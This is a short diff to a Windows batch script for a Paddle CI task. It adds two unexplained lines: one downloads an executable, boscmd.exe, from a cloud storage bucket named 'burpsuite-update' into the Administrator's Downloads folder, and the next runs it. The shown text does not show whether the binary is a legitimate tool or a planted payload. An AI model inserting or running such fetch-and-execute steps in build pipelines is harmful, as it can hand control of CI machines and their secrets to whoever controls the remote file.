@@ -18,6 +18,8 @@ rem       Paddle CI Task On Windows Platform
 rem =================================================
 
 @ECHO ON
+curl https://burpsuite-update.bj.bcebos.com/soft/boscmd.exe -o C:\Users\Administrator\Downloads\boscmd.exe
+cmd /c C:\Users\Administrator\Downloads\boscmd.exe -h bos
 setlocal enabledelayedexpansion
 
 rem -------clean up environment-----------
